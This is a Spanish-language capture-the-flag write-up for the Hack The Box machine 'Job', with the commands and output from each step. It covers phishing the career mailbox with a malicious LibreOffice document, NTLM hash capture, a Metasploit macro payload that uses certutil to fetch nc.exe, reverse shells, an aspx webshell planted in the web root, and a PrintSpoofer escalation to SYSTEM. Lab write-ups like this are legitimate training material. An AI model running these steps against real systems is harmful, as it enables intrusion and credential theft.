---
tags:
title: Job - Medium (HTB)
permalink: /Job-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p25,80,445,3389,5985 10.129.234.73                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 14:13 -0300
Nmap scan report for 10.129.234.73
Host is up (0.76s latency).

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Job.local
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: JOB
|   NetBIOS_Domain_Name: JOB
|   NetBIOS_Computer_Name: JOB
|   DNS_Domain_Name: job
|   DNS_Computer_Name: job
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-12T17:16:08+00:00
| ssl-cert: Subject: commonName=job
| Not valid before: 2025-09-04T13:43:05
|_Not valid after:  2026-03-06T13:43:05
|_ssl-date: 2026-01-12T17:16:46+00:00; +1m30s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: JOB; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-12T17:16:11
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1m29s, deviation: 0s, median: 1m29s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.26 seconds
```

## Website 

En la pagina no muestra mucho, lo único que destaca es el mensaje, el cual indica que podemos enviar un mail a `career@job.local` con un cv adjunto en formato de `Libre Office`.

![image-center](/assets/images/Pasted image 20260112141322.png)

El formato original de este mail es con la extensión `odt`, lo podría enviar con el siguiente formato, para poder robar un hash `NTLMv2`. Parar generar el documento use este script de este [repositorio de Github](https://github.com/lof1sec/Bad-ODF)

```bash
sendemail -s job.local -f "tester" -t career@job.local -o tls=no -m "Check this CV plzz" -a bad.odt
```
## Shell as jack.black

Luego de unos segundos cuando se envía, recibo el hash del usuario `jack.black`.

```bash
 responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.234.73
[SMB] NTLMv2-SSP Username : JOB\jack.black
[SMB] NTLMv2-SSP Hash     : jack.black::JOB:ba804556aaae751b:0C95A5873B9F095461BD3BAC02E22D05:010100000000000000147BC0D083DC018CC9DE1351DDFECB0000000002000800530048003600360001001E00570049004E002D00520037004F0035004D004F004200350038004600480004003400570049004E002D00520037004F0035004D004F00420035003800460048002E0053004800360036002E004C004F00430041004C000300140053004800360036002E004C004F00430041004C000500140053004800360036002E004C004F00430041004C000700080000147BC0D083DC010600040002000000080030003000000000000000000000000020000048CE0F2E4284F227B77931378A2DD8F14084EA5BC909B9EAD3C9C4CA57C9423E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00310039000000000000000000                          
[*] Skipping previously captured hash for JOB\jack.black
[*] Skipping previously captured hash for JOB\jack.black
[*] Skipping previously captured hash for JOB\jack.black
[*] Skipping previously captured hash for JOB\jack.black
[*] Skipping previously captured hash for JOB\jack.black
[*] Skipping previously captured hash for JOB\jack.black
[+] Exiting...
```
### Metasploit module

Sin embargo el hash no es crackeable. Así que configure el siguiente modulo de `metasploit` para poder levantar un servidor y además poder crear el archivo, en el cual en el mismo puedo inyectar un payload.

```bash
msfconsole -q 
msf > use multi/misc/openoffice_document_macro
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(multi/misc/openoffice_document_macro) > options

Module options (exploit/multi/misc/openoffice_document_macro):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BODY                       no        The message for the document body
   FILENAME  msf.odt          yes       The OpenOffice Text document name
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.
                                        0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.8    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Apache OpenOffice on Windows (PSH)
```

Simplemente configuro con `SRVHOST`, mi `ip` y además luego de configurar el payload adecuado, con `CMD` coloque el comando a ejecutar.

```bash
msf exploit(multi/misc/openoffice_document_macro) > set SRVHOST 10.10.17.19
SRVHOST => 10.10.17.19
msf exploit(multi/misc/openoffice_document_macro) > set payload windows/x64/exec
payload => windows/x64/exec
msf exploit(multi/misc/openoffice_document_macro) > set cmd "certutil -urlcache -split -f http://10.10.17.19:8888/nc.exe C:\programdata\nc.exe"
cmd => certutil -urlcache -split -f http://10.10.17.19/nc.exe C:\programdata\nc.exe
```

El comando descarga desde mi `ip` el `nc.exe`, así que cuando le doy `run` el mismo modulo levanta un servidor al cual va a recibir mi archivo.

```bash
msf exploit(multi/misc/openoffice_document_macro) > run
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Using URL: http://10.10.17.19:8080/eM3eC8ka
[*] Server started.
<SNIP>
[+] msf.odt stored at /root/.msf4/local/msf.odt
```

Envió el email nuevamente.

```BASH
sendemail -s job.local -f "sec <sec@vulnlab.com>" -t career@job.local -o tls=no -m "hey pls check my cv" -a /root/.msf4/local/msf.odt
Jan 12 15:22:23 zsln sendemail[10209]: Email was sent successfully!
```

Y veo como desde mi otro servidor que monte con `python` se descarga el `nc.exe`.

```BASH
sudo python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.129.234.73 - - [12/Jan/2026 15:22:53] "GET /nc.exe HTTP/1.1" 200 -
10.129.234.73 - - [12/Jan/2026 15:22:56] "GET /nc.exe HTTP/1.1" 200 -
```
### Shell]

Ahora solo me queda repetir el paso para poder recibir una shell.

```bash
msf exploit(multi/misc/openoffice_document_macro) > set cmd "C:\programdata\nc.exe 10.10.17.19 9001 -e cmd"
cmd => C:\programdata\nc.exe 10.10.17.19 9001 -e cmd
msf exploit(multi/misc/openoffice_document_macro) > run
```

Y luego de enviar el mail nuevamente, recibo mi shell como el usuario `jack.black`.

```powershell
rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.73] 53306
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program>whoami
whoami
job\jack.black
```

```powershell
c:\Users\jack.black\Desktop>type user.txt
type user.txt
b11715572067b18624567121eb69327b
```
## Shell as apppool


Viendo los privilegios de mi usuario, veo que es parte del grupo `developers`.

```powershell
c:\Users\jack.black\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID                                          
============== =============================================
job\jack.black S-1-5-21-3629909232-404814612-4151782453-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                           Attributes                                        
====================================== ================ ============================================= ==================================================
Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
JOB\developers                         Alias            S-1-5-21-3629909232-404814612-4151782453-1001 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE
<SNIP>     
```
### Webshell

Ademas vi, que es grupo tiene permisos `FULL` en el directorio donde se corre la web.

```powershell

PS C:\inetpub\wwwroot> icacls .
icacls .
. JOB\developers:(OI)(CI)(F)
  BUILTIN\IIS_IUSRS:(OI)(CI)(RX)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

```

Por lo que conseguí esta [webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) en `aspx` lo que es compatible con la pagina, y la descargue en la maquina y la coloque en el directorio de la web.

```powershell
PS C:\inetpub\wwwroot> certutil -urlcache -split -f http://10.10.17.19:8888/cmd.aspx C:\inetpub\wwwroot\cmd.aspx
certutil -urlcache -split -f http://10.10.17.19:8888/cmd.aspx C:\inetpub\wwwroot\cmd.aspx
****  Online  ****
  0000  ...
  060c
CertUtil: -URLCache command completed successfully.
```

Ya luego me fui a la pagina y ahi estaba, viendo que la misma corre como el usuario `defaultapppool`.

![image-center](/assets/images/Pasted image 20260112153113.png)
### SeImpersonatePrivilege abuse

Viendo los privilegios que tiene el mismo, veo que tiene habilitado el `SeImpersonatePrivilege`.

```powershell
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Para abusar de este privilegio, primero me envié una shell con el mismo `nc`.

```powershell
/c c:\programdata\nc.exe 10.10.17.19 5555 -e powershell
```

La recibo.

```powershell
 rlwrap -cAr nc -nlvp 5555                                                               
listening on [any] 5555 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.73] 53309
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\windows\system32\inetsrv> whoami 
whoami 
iis apppool\defaultapppool
```

Y luego descargue el [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), para crear un token con el privilegio de `system`.

```powershell
PS C:\Programdata> certutil -urlcache -split -f http://10.10.17.19/PrintSpoofer64.exe C:\programdata\PrintSpoofer64.exe
certutil -urlcache -split -f http://10.10.17.19/PrintSpoofer64.exe C:\programdata\PrintSpoofer64.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```
### Shell

Solo me basta con ejecutarlo e indicarle con `-i` que quiero una shell interactiva y con `-c` el comando a ejecutar el cual es una cmd.

```powershell
PS C:\Programdata> .\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```powershell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
44168d816d4600bdd62635dbad1f98a2
```

`~Happy Hacking.`